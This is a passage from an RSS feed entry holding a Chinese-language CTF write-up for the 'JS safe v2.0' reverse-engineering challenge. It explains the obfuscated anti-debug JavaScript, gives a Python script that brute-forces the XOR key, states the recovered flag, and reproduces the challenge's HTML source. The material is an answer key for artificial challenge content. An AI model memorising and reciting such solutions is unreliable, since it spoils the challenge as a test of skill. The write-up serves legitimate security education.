+&lt;p&gt;可以看到这里会先做一个正则匹配，我们输入的内容格式必须是 &lt;code&gt;CTF{xxxxxx}&lt;/code&gt;，其中 xxxxxx 的范围为 &lt;code&gt;0-9a-zA-Z_@!?-&lt;/code&gt;，囊括了大部分的可见字符&lt;/p&gt;
+
+&lt;p&gt;然后会将 &lt;code&gt;xxxxxx&lt;/code&gt; 作为参数传入 &lt;code&gt;x()&lt;/code&gt; 函数，所以我们这里需要 &lt;code&gt;x()&lt;/code&gt; 函数返回一个 true 值（或者非空即可）&lt;/p&gt;
+
+&lt;p&gt;这里有三个要点需要注意：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;x 和 х 的区别，前者是 ASCII 字符，后者是西里尔字母，而 &lt;code&gt;x = h(str(x));&lt;/code&gt; 实际上的参数是函数自身字符串内容，并不是我们传入的参数&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;for (a = 0; a != 1000; a++) debugger;&lt;/code&gt; 运行后 a = 1000，所以当 h 函数被调用时，内部的 a 初始值为 1000&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function h(s) {
+    for (i = 0; i != s.length; i++) {
+        a = ((typeof a == &#39;undefined&#39; ? 1 : a) + ord(str(s[i]))) % 65521;
+        b = ((typeof b == &#39;undefined&#39; ? 0 : b) + a) % 65521
+    }
+    return chr(b &amp;gt;&amp;gt; 8) + chr(b &amp;amp; 0xFF) + chr(a &amp;gt;&amp;gt; 8) + chr(a &amp;amp; 0xFF)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;source = /Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;&lt;/code&gt; 是正则模板，其没有 &lt;code&gt;.length&lt;/code&gt; 属性，所以循环应该会无限进行，但由于使用了 &lt;code&gt;with&lt;/code&gt;，则实际访问的则是 &lt;code&gt;source.source&lt;/code&gt; ，对应的是正则模板的字符串，具有 &lt;code&gt;.length&lt;/code&gt; 属性&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;writeup&#34;&gt;Writeup&lt;/h2&gt;
+
+&lt;p&gt;优化后的代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function x(х) {
+    ord = Function.prototype.call.bind(&#39;&#39;.charCodeAt);
+    chr = String.fromCharCode;
+    str = String;
+
+    function h(s) {
+        for (i = 0; i != s.length; i++) {
+            a = ((typeof a == &#39;undefined&#39; ? 1 : a) + ord(str(s[i]))) % 65521;
+            b = ((typeof b == &#39;undefined&#39; ? 0 : b) + a) % 65521
+        }
+        return chr(b &amp;gt;&amp;gt; 8) + chr(b &amp;amp; 0xFF) + chr(a &amp;gt;&amp;gt; 8) + chr(a &amp;amp; 0xFF)
+    }
+
+    function c(a, b, c) {
+        for (i = 0; i != a.length; i++) c = (c || &#39;&#39;) + chr(ord(str(a[i])) ^ ord(str(b[i % b.length])));
+        return c
+    }
+
+    var a = 1000;
+
+    x = h(str(`function x(х){ord=Function.prototype.call.bind(&#39;&#39;.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a==&#39;undefined&#39;?1:a)+ord(str(s[i])))%65521;b=((typeof b==&#39;undefined&#39;?0:b)+a)%65521}return chr(b&amp;gt;&amp;gt;8)+chr(b&amp;amp;0xFF)+chr(a&amp;gt;&amp;gt;8)+chr(a&amp;amp;0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||&#39;&#39;)+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log(&#39;debug&#39;,source);with(source)return eval(&#39;eval(c(source,x))&#39;)}catch(e){}}`));
+
+    source = `Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨`;
+
+    try {
+        console.log(c(source,x));
+        with(source) return eval(&#39;eval(c(source,x))&#39;)
+    } catch (e) {
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行后可以得到如下表达式：&lt;code&gt;х==c(&#39;¢×&amp;amp;Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&amp;amp;¨þJ&#39;,h(х))//᧢&lt;/code&gt;，写 python 脚本爆破即可&lt;/p&gt;
+
+&lt;p&gt;由于我们传入的参数对应的字符范围已知，并且加密密钥长度为 4，我们只需要根据加密函数爆破相应加密密钥：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function c(a, b, c) {
+    for (i = 0; i != a.length; i++) c = (c || &#39;&#39;) + chr(ord(str(a[i])) ^ ord(str(b[i % b.length])));
+    return c
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;p = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@!?-&#39;
+
+sec = &#39;&#39;&#39;¢×&amp;amp;Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&amp;amp;¨þJ&#39;&#39;&#39;
+
+for i in range(4):
+    for c in p:
+        j = i 
+        k0 = ord(sec[j])^ord(c)
+        flag = True
+        while j &amp;lt; len(sec)-4:
+            j += 4
+            if chr(k0^ord(sec[j])) not in p:
+                flag = False
+                break
+        if flag:
+            print(&#39;%d: %d&#39; % (i, k0))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据结果可以得到 &lt;code&gt;[253, 149, 21, 249]&lt;/code&gt; \ &lt;code&gt;[253, 153, 21, 249]&lt;/code&gt; 两种可能的 key 值，直接带入测试即可&lt;/p&gt;
+
+&lt;p&gt;直接带入可以解出真正的原文 &lt;code&gt;_N3x7-v3R51ON-h45-AnTI-4NTi-ant1-D3bUg_&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;这题本质上是一道 reverse 题，使用了一种非常简单的加密，唯一的难度是有意无意使用了一些 trick 的技巧使得我们第一时间没有发现（比如我😭）&lt;/p&gt;
+
+&lt;h2 id=&#34;source-code&#34;&gt;Source Code&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+&amp;lt;title&amp;gt;JS safe v2.0 - the leading localStorage based safe solution with military grade JS anti-debug technology&amp;lt;/title&amp;gt;
+&amp;lt;!--
+Advertisement:
+Looking for a hand-crafted, browser based virtual safe to store your most
+interesting secrets? Look no further, you have found it. You can order your own
+by sending a mail to js_safe@example.com. When ordering, please specify the
+password you&#39;d like to use to open and close the safe. We&#39;ll hand craft a
+unique safe just for you, that only works with your password of choice.
+--&amp;gt;
+&amp;lt;style&amp;gt;
+body {
+  text-align: center;
+}
+input {
+  font-size: 200%;
+  margin-top: 5em;
+  text-align: center;
+  width: 26em;
+}
+#result {
+  margin-top: 8em;
+  font-size: 300%;
+  font-family: monospace;
+  font-weight: bold;
+}
+body.granted&amp;gt;#result::before {
+  content: &amp;quot;Access Granted&amp;quot;;
+  color: green;
+}
+body.denied&amp;gt;#result::before {
+  content: &amp;quot;Access Denied&amp;quot;;
+  color: red;
+}
+#content {
+  display: none;
+}
+body.granted #content {
+  display: initial;
+}
+.wrap {
+  display: inline-block;
+  margin-top: 50px;
+  perspective: 800px;
+  perspective-origin: 50% 100px;
+}
+.cube {
+  position: relative;
+  width: 200px;
+  transform-style: preserve-3d;
+}
+.back {
+  transform: translateZ(-100px) rotateY(180deg);
+}
+.right {
+  transform: rotateY(-270deg) translateX(100px);
+  transform-origin: top right;
+}
+.left {
+  transform: rotateY(270deg) translateX(-100px);
+  transform-origin: center left;
+}
+.top {
+  transform: rotateX(-90deg) translateY(-100px);
+  transform-origin: top center;
+}
+.bottom {
+  transform: rotateX(90deg) translateY(100px);
+  transform-origin: bottom center;
+}
+.front {
+  transform: translateZ(100px);
+}
+@keyframes spin {
+  from { transform: rotateY(0); }
+  to { transform: rotateY(360deg); }
+}
+.cube {
+  animation: spin 20s infinite linear;
+}
+.cube div {
+  position: absolute;
+  width: 200px;
+  height: 200px;
+  background: rgba(0, 0, 0, 0.51);
+  box-shadow: inset 0 0 60px white;
+  font-size: 20px;
+  text-align: center;
+  line-height: 200px;
+  color: rgba(0,0,0,0.5);
+  font-family: sans-serif;
+  text-transform: uppercase;
+}
+&amp;lt;/style&amp;gt;
+&amp;lt;script&amp;gt;
+function x(х){ord=Function.prototype.call.bind(&#39;&#39;.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a==&#39;undefined&#39;?1:a)+ord(str(s[i])))%65521;b=((typeof b==&#39;undefined&#39;?0:b)+a)%65521}return chr(b&amp;gt;&amp;gt;8)+chr(b&amp;amp;0xFF)+chr(a&amp;gt;&amp;gt;8)+chr(a&amp;amp;0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||&#39;&#39;)+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log(&#39;debug&#39;,source);with(source)return eval(&#39;eval(c(source,x))&#39;)}catch(e){}}
+&amp;lt;/script&amp;gt;
+&amp;lt;script&amp;gt;
+function open_safe() {
+  keyhole.disabled = true;
+  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
+  if (!password || !x(password[1])) return document.body.className = &#39;denied&#39;;
+  document.body.className = &#39;granted&#39;;
+  password = Array.from(password[1]).map(c =&amp;gt; c.charCodeAt());
+  encrypted = JSON.parse(localStorage.content || &#39;&#39;);
+  content.value = encrypted.map((c,i) =&amp;gt; c ^ password[i % password.length]).map(String.fromCharCode).join(&#39;&#39;)
+}
+function save() {
+  plaintext = Array.from(content.value).map(c =&amp;gt; c.charCodeAt());
+  localStorage.content = JSON.stringify(plaintext.map((c,i) =&amp;gt; c ^ password[i % password.length]));
+}
+&amp;lt;/script&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;div&amp;gt;
+  &amp;lt;input id=&amp;quot;keyhole&amp;quot; autofocus onchange=&amp;quot;open_safe()&amp;quot; placeholder=&amp;quot;🔑&amp;quot;&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;div class=&amp;quot;wrap&amp;quot;&amp;gt;
+  &amp;lt;div class=&amp;quot;cube&amp;quot;&amp;gt;
+    &amp;lt;div class=&amp;quot;front&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;div class=&amp;quot;back&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;div class=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;div class=&amp;quot;bottom&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;div class=&amp;quot;left&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;div class=&amp;quot;right&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+  &amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;div id=&amp;quot;result&amp;quot;&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;div&amp;gt;
+  &amp;lt;input id=&amp;quot;content&amp;quot; onchange=&amp;quot;save()&amp;quot;&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
